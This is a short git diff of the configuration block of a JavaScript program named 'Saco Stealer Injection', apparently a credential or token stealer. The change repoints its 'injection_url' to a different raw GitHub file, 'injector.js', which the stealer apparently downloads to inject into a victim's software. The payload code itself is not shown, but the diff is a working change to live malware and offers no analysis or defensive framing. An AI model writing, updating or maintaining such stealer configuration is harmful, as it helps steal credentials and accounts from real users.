@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Saco Stealer Injection', 
   embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Saco Stealer-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/SacoXd/injection/main/injector.js', 
   /**
    
    **/
